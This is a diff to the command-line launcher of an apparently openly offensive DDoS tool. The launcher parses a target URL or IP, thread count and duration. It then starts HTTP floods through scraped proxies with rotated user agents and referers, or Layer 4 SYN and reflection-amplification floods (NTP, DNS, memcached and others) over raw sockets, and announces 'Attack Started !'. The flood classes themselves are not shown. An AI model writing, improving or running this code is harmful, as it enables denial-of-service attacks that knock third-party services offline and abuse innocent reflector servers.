@@ -789,96 +789,98 @@ class ToolsConsole:
 if __name__ == '__main__':
     with open(currentDir / "config.json") as f:
         con = load(f)
+        with suppress(KeyboardInterrupt):
+            with suppress(IndexError):
+                one = argv[1].upper()
 
-        with suppress(IndexError):
-            one = argv[1].upper()
+                if one == "HELP": raise IndexError()
+                if one == "TOOLS": ToolsConsole.runConsole()
+                if one == "STOP": ToolsConsole.stop()
 
-            if one == "HELP": raise IndexError()
-            if one == "TOOLS": ToolsConsole.runConsole()
-            if one == "STOP": ToolsConsole.stop()
+                method = one
+                event = Event()
 
-            method = one
-            event = Event()
+                if method in Methods.LAYER7_METHODS:
+                    url = URL(argv[2].strip())
+                    threads = int(argv[4])
+                    rpc = int(argv[6])
+                    timer = int(argv[7])
+                    proxy_ty = int(argv[3].strip())
+                    proxy_li = Path(currentDir / "files/proxys/" / argv[5].strip())
+                    useragent_li = Path(currentDir / "files/useragent.txt")
+                    referers_li = Path(currentDir / "files/referers.txt")
+                    proxies: Any = set()
 
-            if method in Methods.LAYER7_METHODS:
-                url = URL(argv[2].strip())
-                threads = int(argv[4])
-                rpc = int(argv[6])
-                timer = int(argv[7])
-                proxy_ty = int(argv[3].strip())
-                proxy_li = Path(currentDir / "files/proxys/" / argv[5].strip())
-                useragent_li = Path(currentDir / "files/useragent.txt")
-                referers_li = Path(currentDir / "files/referers.txt")
-                proxies: Any = set()
+                    if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
+                    if not referers_li.exists(): exit("The Referer file doesn't exist ")
 
-                if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
-                if not referers_li.exists(): exit("The Referer file doesn't exist ")
+                    uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
+                    referers = set(a.strip() for a in referers_li.open("r+").readlines())
 
-                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip() for a in referers_li.open("r+").readlines())
+                    if not uagents: exit("Empty Useragent File ")
+                    if not referers: exit("Empty Referer File ")
 
-                if not uagents: exit("Empty Useragent File ")
-                if not referers: exit("Empty Referer File ")
+                    if proxy_ty not in {4, 5, 1}: exit("Socks Type Not Found [4, 5, 1]")
+                    if threads > 1000: print("WARNING! thread is higher than 1000")
+                    if rpc > 100: print("WARNING! RPC (Request Pre Connection) is higher than 100")
 
-                if proxy_ty not in {4, 5, 1}: exit("Socks Type Not Found [4, 5, 1]")
-                if threads > 1000: print("WARNING! thread is higher than 1000")
-                if rpc > 100: print("WARNING! RPC (Request Pre Connection) is higher than 100")
+                    if not proxy_li.exists():
+                        if rpc > 100: print("WARNING! The file doesn't exist, creating files and downloading proxies.")
+                        proxy_li.parent.mkdir(parents=True, exist_ok=True)
+                        with proxy_li.open("w") as wr:
+                            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+                            Proxies = ProxyManager.checkAll(Proxies, url.human_repr(), threads)
 
-                if not proxy_li.exists():
-                    if rpc > 100: print("WARNING! The file doesn't exist, creating files and downloading proxies.")
-                    proxy_li.mkdir(parents=True, exist_ok=True)
-                    with proxy_li.open("a+") as wr:
-                        Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-                        Proxies = ProxyManager.checkAll(Proxies, url.human_repr(), threads)
+                            stringBuilder = ""
+                            for proxy in Proxies:
+                                stringBuilder += (proxy.__str__() + "\n")
+                            wr.write(stringBuilder)
 
-                        for proxy in Proxies:
-                            wr.write(proxy.__str__() + "\n")
+                    with proxy_li.open("r+") as rr:
+                        for pro in Regex.IPPort.findall(rr.read()):
+                            proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))
 
-                with proxy_li.open("r+") as rr:
-                    for pro in Regex.IPPort.findall(rr.read()):
-                        proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))
+                    if not proxies:
+                        print("Empty Proxy File, Running flood witout proxy")
+                        proxies = None
+                    if proxies:
+                        print("Proxy Count: %d" % len(proxies))
+                    for _ in range(threads):
+                        HttpFlood(url, method, rpc, event, uagents, referers, proxy_ty, proxies).start()
+                if method in Methods.LAYER4_METHODS:
+                    target = argv[2].strip()
+                    if ":" in target and not target.split(":")[1].isnumeric(): exit("Invalid Port Number")
+                    port = 53 if ":" not in target else int(target.split(":")[1])
+                    threads = int(argv[3])
+                    timer = int(argv[4])
+                    ref = None
 
-                if not proxies:
-                    print("Empty Proxy File, Running flood witout proxy")
-                    proxies = None
-                if proxies:
-                    print("Proxy Count: %d" % len(proxies))
-                for _ in range(threads):
-                    HttpFlood(url, method, rpc, event, uagents, referers, proxy_ty, proxies).start()
-            if method in Methods.LAYER4_METHODS:
-                target = argv[2].strip()
-                if ":" in target and not target.split(":")[1].isnumeric(): exit("Invalid Port Number")
-                port = 53 if ":" not in target else int(target.split(":")[1])
-                threads = int(argv[3])
-                timer = int(argv[4])
-                ref = None
+                    if ":" not in target:
+                        print("WARNING! Port Not Selected, Set To Default: 80")
+                    else:
+                        target = target.split(":")[0]
 
-                if ":" not in target:
-                    print("WARNING! Port Not Selected, Set To Default: 80")
-                else:
-                    target = target.split(":")[0]
+                    if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
+                    if not Regex.IP.match(target): exit("Invalid Ip Selected")
 
-                if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
-                if not Regex.IP.match(target): exit("Invalid Ip Selected")
+                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
+                            not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
 
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
-                        not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
+                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                        if len(argv) == 6:
+                            refl_li = Path(currentDir / "files" / argv[5].strip())
+                            if not refl_li.exists(): exit("The Reflector file doesn't exist ")
+                            ref = set(a.strip() for a in Regex.IP.findall(refl_li.open("r+").read()))
+                        if not ref: exit("Empty Reflector File ")
 
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
-                    if len(argv) == 6:
-                        refl_li = Path(currentDir / "files" / argv[5].strip())
-                        if not refl_li.exists(): exit("The Reflector file doesn't exist ")
-                        ref = set(a.strip() for a in Regex.IP.findall(refl_li.open("r+").read()))
-                    if not ref: exit("Empty Reflector File ")
+                    for _ in range(threads):
+                        Layer4((target, port), ref, method, event).start()
 
-                for _ in range(threads):
-                    Layer4((target, port), ref, method, event).start()
-
-            print("Attack Started !")
-            event.set()
-            while timer:
-                timer -= 1
-                sleep(1)
-            event.clear()
-            exit()
-        ToolsConsole.usage()
+                print("Attack Started !")
+                event.set()
+                while timer:
+                    timer -= 1
+                    sleep(1)
+                event.clear()
+                exit()
+            ToolsConsole.usage()
